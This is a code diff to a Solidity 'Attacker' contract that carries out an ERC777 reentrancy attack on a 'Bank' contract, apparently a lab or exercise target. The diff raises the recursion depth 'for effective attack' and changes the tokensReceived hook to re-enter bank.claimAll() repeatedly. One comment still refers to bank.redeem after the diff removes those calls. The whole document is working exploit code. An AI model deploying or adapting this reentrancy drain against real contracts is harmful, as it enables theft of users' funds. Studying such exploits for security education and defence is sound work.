@@ -14,7 +14,7 @@ contract Attacker is AccessControl, IERC777Recipient {
     ); // EIP1820 registry address
     bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
     uint8 private depth = 0;
-    uint8 private constant max_depth = 2;
+    uint8 private constant max_depth = 5; // Adjusted recursion depth for effective attack
 
     Bank public bank;
 
@@ -46,12 +46,8 @@ contract Attacker is AccessControl, IERC777Recipient {
         // Deposit ETH to receive tokens
         bank.deposit{value: amt}();
 
-        // Approve bank to spend our tokens
-        ERC777 token = bank.token();
-        token.approve(address(bank), token.balanceOf(address(this)));
-
-        // Start reentrancy attack by calling redeem
-        bank.redeem(token.balanceOf(address(this)));
+        // Start the reentrancy attack by calling claimAll
+        bank.claimAll();  // This will trigger tokensReceived
     }
 
     /*
@@ -65,15 +61,15 @@ contract Attacker is AccessControl, IERC777Recipient {
     }
 
     /*
-        This function is called when the Bank contract sends MCITR tokens.
+        This function is called when the Bank contract sends tokens.
     */
     function tokensReceived(
-        address operator,
-        address from,
-        address to,
-        uint256 amount,
-        bytes calldata userData,
-        bytes calldata operatorData
+        address, /* operator */
+        address, /* from */
+        address, /* to */
+        uint256, /* amount */
+        bytes calldata, /* userData */
+        bytes calldata /* operatorData */
     ) external override {
         // Ensure the function is called by the expected token contract
         require(msg.sender == address(bank.token()), "Invalid token sender");
@@ -81,15 +77,14 @@ contract Attacker is AccessControl, IERC777Recipient {
         if (depth < max_depth) {
             depth++;
 
-            // Approve bank to spend our tokens
-            ERC777 token = bank.token();
-            token.approve(address(bank), token.balanceOf(address(this)));
-
-            // Reentrantly call redeem to exploit reentrancy
-            bank.redeem(token.balanceOf(address(this)));
+            // Reentrantly call claimAll to exploit reentrancy
+            bank.claimAll();
 
             emit Recurse(depth);
         }
         depth--;
     }
+
+    // Fallback function to receive ETH from bank.redeem
+    receive() external payable {}
 }
